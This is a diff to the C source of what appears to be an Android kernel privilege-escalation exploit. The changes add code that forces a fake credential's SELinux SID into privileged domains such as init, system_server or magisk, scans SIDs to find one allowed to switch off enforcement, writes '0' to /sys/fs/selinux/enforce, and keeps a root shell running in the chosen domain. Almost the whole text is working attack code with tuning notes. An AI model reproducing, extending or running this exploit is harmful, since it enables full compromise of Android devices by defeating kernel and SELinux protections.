@@ -710,6 +710,24 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
+  if (mode == WRITE_MODE_CRED_SELINUX && env_flag("GHOST_ENFORCE_INIT", 0)) {
+    /* Verified from the kernel image: selinux_initialized() is
+     *   add x8, state, #SELINUX_STATE_INITIALIZED_OFF (2)
+     *   ldarb w8, [x8]
+     *   tbz w8, #0, <not initialized>      <- tests BIT 0 (bool load)
+     * so the byte at +2 must be ODD. Our value is page_base+SELFTEST_OFF,
+     * therefore that byte is the page's phys bits 16..23, fixed per page.
+     * If it is even the write would leave initialized false (secctx/binder
+     * break), so skip this page and let the attempt loop reclaim another. */
+    unsigned b2 = (unsigned)((page_base >> 16) & 0xff);
+    if ((b2 & 1) == 0) {
+      pr_warning("selinux write: page byte2=0x%02x is EVEN -> initialized would "
+                 "read 0; retrying with another page\n", b2);
+      clear_pselect_write();
+      return 0;
+    }
+    pr_info("selinux write: page byte2=0x%02x (odd -> initialized bit0=1)\n", b2);
+  }
   if (mode == 6) {
     /* Walk 0: cred. Plan: walk 1 targets real_cred (= target - 8). */
     ghost_push_plan(pselect_custom_target - 8, page_base + FAKE_CRED_OFF);
@@ -1060,6 +1078,19 @@ static int sid_ctx_is_shell(const char *ctx, long len, const char *child_ctx) {
   if (clen > 0)
     return len == clen && sid_memeq(ctx, child_ctx, clen);
   return sid_contains(ctx, len, "shell");
+}
+
+/* Domains that plausibly may hold security:security setenforce on Android.
+ * Kept narrow on purpose: probing every SID would emit one AVC denial per
+ * candidate and storm the audit ring. */
+static int sid_ctx_may_setenforce(const char *ctx, long len) {
+  static const char *marks[] = {
+    "u:r:init:", "u:r:init_shell:", "u:r:su:", "u:r:magisk:",
+    "u:r:shell:", "u:r:system_server:", "u:r:kernel:",
+  };
+  for (unsigned i = 0; i < sizeof(marks) / sizeof(marks[0]); i++)
+    if (sid_contains(ctx, len, marks[i])) return 1;
+  return 0;
 }
 
 static void sid_nanosleep_usec(long usec) {
@@ -2141,6 +2172,39 @@ static int run_cred_swap(void) {
   int sid_default = env_int_range("GHOST_SID_DEFAULT", 1374, 0, 32767);
   int sid_scan_max = env_int_range("GHOST_SID_MAX", 4096, 64, 32767);
   int sid_scan_enable = env_flag("GHOST_SID_SCAN", 1);
+  /* PHASE A test hook: force current_sid() to GHOST_SID even when it is not
+   * the shell context (e.g. 6 = u:r:init:s0). Used to check whether a
+   * privileged domain can write /sys/fs/selinux/enforce so we can get
+   * enforcing=0 WITHOUT the selinux_state zero-write (which clears
+   * ->initialized and breaks binder's security_secid_to_secctx()). */
+  int sid_force_any = env_flag("GHOST_SID_ANY", 0);
+  /* PHASE A.1: also probe /sys/fs/selinux/enforce per SID. The write needs
+   * security:security setenforce (NOT the selinuxfs file permission), so we
+   * look for a privileged domain that holds it. Narrowed to plausible
+   * domains to avoid an AVC audit storm over ~1400 SIDs. */
+  int sid_scan_enforce = env_flag("GHOST_SID_SCAN_SETENFORCE", 0);
+  /* Keep the forced SID for the battery and the root shell instead of
+   * restoring the shell SID. Lets you run the shell in a domain that
+   * already has the access you need (e.g. installd for /data/data,
+   * system_server for package work) while SELinux stays enforcing. */
+  int sid_keep = env_flag("GHOST_SID_KEEP", 0);
+  /* Optional substring to locate in the SID->context scan, e.g.
+   * GHOST_SID_SCAN_CTX=u:r:init:s0. Verified per-SID through the same
+   * /proc/self/attr/current oracle; the numeric SID is policy-specific
+   * (SID 6 is NOT necessarily init). Copied now: post-walk code must not
+   * touch libc getenv. */
+  char sid_ctx_target[40] = {0};
+  {
+    const char *sct = getenv("GHOST_SID_SCAN_CTX");
+    if (sct) {
+      int _i = 0;
+      while (sct[_i] && _i < (int)sizeof(sid_ctx_target) - 1) {
+        sid_ctx_target[_i] = sct[_i];
+        _i++;
+      }
+      sid_ctx_target[_i] = 0;
+    }
+  }
   g_settle_ms = env_int_range("GHOST_SETTLE_MS", 4000, 0, 30000);
 
   uint32_t uid_before = getuid();
@@ -2251,10 +2315,171 @@ static int run_cred_swap(void) {
           hit_page = uring_block(0);
         }
 
-        if (g_selinux_off) {
+        if (sid_force_any && !g_selinux_off &&
+            (sid_env_override > 0 || sid_ctx_target[0])) {
+          /* PHASE A: force current_sid() to GHOST_SID, bypassing the
+           * "must be the shell context" check. The fake cred normally
+           * borrows the REAL shell blob (g_leaked_security_ptr), which is
+           * shared and must not be mutated, so re-point cred->security at
+           * our private page blob first (same recovery path as below).
+           * e.g. GHOST_SID=6 GHOST_SID_ANY=1 -> u:r:init:s0; then in the
+           * root shell try `echo 0 > /sys/fs/selinux/enforce`. */
+          if (hit_page && page_base) {
+            *(volatile uint64_t *)(hit_page + FAKE_CRED_OFF +
+                                   CRED15_SECURITY_OFF) =
+                (uint64_t)(page_base + SKB_DATA_DELTA + FAKE_SEC_BLOB_OFF);
+            __atomic_thread_fence(__ATOMIC_SEQ_CST);
+            g_leaked_security_ptr = 0;
+            uint32_t orig_sid = cached_sid;
+            uint32_t use_sid = sid_env_override > 0
+                                   ? (uint32_t)sid_env_override
+                                   : (uint32_t)sid_default;
+
+            /* Optional one-pass SID->context scan: locate a target domain
+             * (e.g. u:r:init:s0) without knowing its numeric SID. The
+             * self-attr readback is the oracle - invalid/denied SIDs fail,
+             * valid ones return their context string. Paced like the
+             * normal scan so AVC/RCU reclaim is not stormed. */
+            uint32_t shell_sid = 0, enforce_sid = 0;
+            if (sid_ctx_target[0] || sid_scan_enforce) {
+              int hit = 0;
+              RELAY_STR("sid: SCAN 2.."); RELAY_DEC(sid_scan_max);
+              if (sid_ctx_target[0]) {
+                RELAY_STR(" for "); RELAY_STR(sid_ctx_target);
+              }
+              if (sid_scan_enforce) RELAY_STR(" +setenforce-probe");
+              RELAY_STR("\n");
+              /* start at 1: the enforce check may be held by SECINITSID_KERNEL */
+              for (int s = 1; s <= sid_scan_max; s++) {
+                blob_set_sid(hit_page, (uint32_t)s);
+                char scb[128];
+                long sn = sid_read_ctx(scb, sizeof(scb));
+                if (sn > 0) {
+                  /* Remember the real shell SID so the post-probe restore
+                   * does not land on a stale/wrong cached SID. */
+                  if (!shell_sid && sid_ctx_is_shell(scb, sn, child_ctx))
+                    shell_sid = (uint32_t)s;
+                  if (sid_ctx_target[0] && !hit &&
+                      sid_contains(scb, sn, sid_ctx_target)) {
+                    RELAY_STR("sid: SIDHIT "); RELAY_DEC(s);
+                    RELAY_STR(" ctx="); RELAY_STR(scb); RELAY_STR("\n");
+                    use_sid = (uint32_t)s; hit = 1;
+                  }
+                  if (sid_scan_enforce && !enforce_sid &&
+                      sid_ctx_may_setenforce(scb, sn)) {
+                    int efd = (int)syscall(__NR_openat, AT_FDCWD,
+                                           "/sys/fs/selinux/enforce",
+                                           O_WRONLY, 0);
+                    if (efd >= 0) {
+                      long wr = (long)syscall(__NR_write, efd, "0", 1);
+                      syscall(__NR_close, efd);
+                      if (wr == 1) {
+                        enforce_sid = (uint32_t)s;
+                        RELAY_STR("sid: ENFORCE_OK "); RELAY_DEC(s);
+                        RELAY_STR(" ctx="); RELAY_STR(scb); RELAY_STR("\n");
+                      }
+                    }
+                  }
+                }
+                if (enforce_sid) break;
+                if ((s & 0x7F) == 0) sid_nanosleep_usec(300);
+              }
+              if (sid_scan_enforce && !enforce_sid)
+                RELAY_STR("sid: ENFORCE_NONE (no privileged domain has "
+                          "security:security setenforce)\n");
+              if (sid_ctx_target[0] && !hit) {
+                RELAY_STR("sid: SCAN no match, probing SID=");
+                RELAY_DEC(use_sid); RELAY_STR("\n");
+              }
+              if (enforce_sid) use_sid = enforce_sid;
+            }
+
+            blob_set_sid(hit_page, use_sid);
+            char fcb[128];
+            long fn = sid_read_ctx(fcb, sizeof(fcb));
+            RELAY_STR("sid: FORCE "); RELAY_DEC(use_sid);
+            RELAY_STR(" ctx=");
+            if (fn > 0) RELAY_STR(fcb); else RELAY_STR("(readback failed)");
+            RELAY_STR("\n");
+            /* Direct probe, no exec: can the FORCED domain write
+             * selinuxfs? A success here already makes the whole system
+             * permissive with selinux_state->initialized left intact. */
+            {
+              long ewr = -999; int eopen = -1, oerr = 0, werr = 0;
+              int efd = (int)syscall(__NR_openat, AT_FDCWD,
+                                     "/sys/fs/selinux/enforce", O_WRONLY, 0);
+              if (efd >= 0) {
+                eopen = 0;
+                ewr = (long)syscall(__NR_write, efd, "0", 1);
+                if (ewr != 1) werr = errno;
+                syscall(__NR_close, efd);
+              } else {
+                oerr = errno;
+              }
+              char eb[8];
+              long ern = -1;
+              int rfd = (int)syscall(__NR_openat, AT_FDCWD,
+                                     "/sys/fs/selinux/enforce", O_RDONLY, 0);
+              if (rfd >= 0) {
+                ern = (long)syscall(__NR_read, rfd, eb, sizeof(eb) - 1);
+                syscall(__NR_close, rfd);
+              }
+              RELAY_STR("sid: FORCE setenforce ");
+              if (ewr == 1) RELAY_STR("OK");
+              else {
+                RELAY_STR("FAIL open="); RELAY_DEC(eopen);
+                if (oerr) { RELAY_STR(" errno="); RELAY_DEC(oerr); }
+                RELAY_STR(" write="); RELAY_DEC(ewr);
+                if (werr) { RELAY_STR(" errno="); RELAY_DEC(werr); }
+              }
+              RELAY_STR(" enforce=");
+              if (ern > 0) {
+                char ec = eb[0];
+                RELAY_PUTC((ec == '\n' || ec == 0) ? '?' : ec);
+              } else {
+                RELAY_STR("?");
+              }
+              RELAY_STR("\n");
+            }
+            /* Restore the pre-force SID so the battery and the root-shell
+             * clone still work even if the probed domain is restricted
+             * (SID 6 denies process:fork, so clone() failed). Prefer the
+             * SID the scan actually matched to child_ctx: the cached
+             * value can be stale (observed 1398 -> u:r:prng_seeder:s0).
+             * If the probe succeeded, enforcing is already 0 anyway. */
+            if (sid_keep) {
+              RELAY_STR("sid: KEEP forced SID="); RELAY_DEC(use_sid);
+              RELAY_STR(" (battery + root shell run in this domain)\n");
+            } else if (shell_sid) {
+              blob_set_sid(hit_page, shell_sid);
+              RELAY_STR("sid: restore shell SID="); RELAY_DEC(shell_sid);
+              RELAY_STR("\n");
+            } else if (orig_sid) {
+              blob_set_sid(hit_page, orig_sid);
+            } else {
+              blob_set_sid(hit_page, 1);
+            }
+            found_sid = (int)use_sid;
+            sid_how = "forced";
+          } else {
+            RELAY_STR("sid: FORCE requested but hit_page/page_base missing\n");
+          }
+        } else if (g_selinux_off) {
           /* selinux_state zeroed (mode 7 walk 0): avc_denied() never
            * denies, so the SID value no longer matters for access. */
           RELAY_STR("sid: selinux OFF - no SID resolution needed\n");
+          /* Distinguish GHOST_ENFORCE_INIT (initialized kept -> binder
+           * still works) from the legacy zero-write (initialized=0 ->
+           * security_secid_to_secctx fails). The self-attr readback only
+           * succeeds when the sidtab is usable, i.e. initialized != 0. */
+          {
+            char icb[128];
+            long icn = sid_read_ctx(icb, sizeof(icb));
+            RELAY_STR("init check: attr/current=");
+            if (icn > 0) RELAY_STR(icb);
+            else RELAY_STR("FAIL -> initialized==0 (secctx/binder will break)");
+            RELAY_STR("\n");
+          }
           sid_how = "selinux-off";
           if (hit_page && cached_sid) blob_set_sid(hit_page, cached_sid);
           found_sid = -1;
@@ -2425,15 +2650,18 @@ static int run_cred_swap(void) {
           for (int _i = 0; _i < 8; _i++)
             RELAY_PUTC("0123456789abcdef"[(found_sid >> (28 - _i * 4)) & 0xf]);
           RELAY_STR(") how="); RELAY_STR(sid_how); RELAY_STR("\n");
-          /* Lock in the working SID */
-          blob_set_sid(hit_page, (uint32_t)found_sid);
+          /* Lock in the working SID (force mode already restored it). */
+          if (!sid_force_any) blob_set_sid(hit_page, (uint32_t)found_sid);
           /* Cache for the next run: the relay child persists this line
-           * to GL_SID_CACHE_PATH when it dumps the payload. */
-          RELAY_STR(GL_SID_CACHE_TAG);
-          RELAY_STR("FP="); RELAY_STR(child_fp);
-          RELAY_STR(" SID="); RELAY_DEC(found_sid);
-          RELAY_STR(" CTX="); RELAY_STR(child_ctx);
-          RELAY_STR("\n");
+           * to GL_SID_CACHE_PATH when it dumps the payload. Never cache a
+           * forced (non-shell) SID - it would poison the normal path. */
+          if (!sid_force_any) {
+            RELAY_STR(GL_SID_CACHE_TAG);
+            RELAY_STR("FP="); RELAY_STR(child_fp);
+            RELAY_STR(" SID="); RELAY_DEC(found_sid);
+            RELAY_STR(" CTX="); RELAY_STR(child_ctx);
+            RELAY_STR("\n");
+          }
         }
         /* user_ns live-tune (SAFE): cap_capable() walks the ns ancestor
          * chain (ns = targ_ns; ns != cred->user_ns; ns = ns->parent) and
